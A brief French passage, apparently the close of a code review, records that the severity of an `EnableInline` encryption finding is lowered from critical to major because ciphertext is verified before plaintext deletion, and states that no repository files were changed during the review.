Une divergence entre deux rapports a été arbitrée : sur `EnableInline`, le ciphertext **est** exporté, relu et vérifié avant la suppression du clair. L'état résultant d'un échec d'écriture du marqueur est donc une stack incohérente à réparer, non une destruction définitive — cotation ramenée de critique à majeur.

Aucun fichier du dépôt n'a été modifié pendant cette revue.
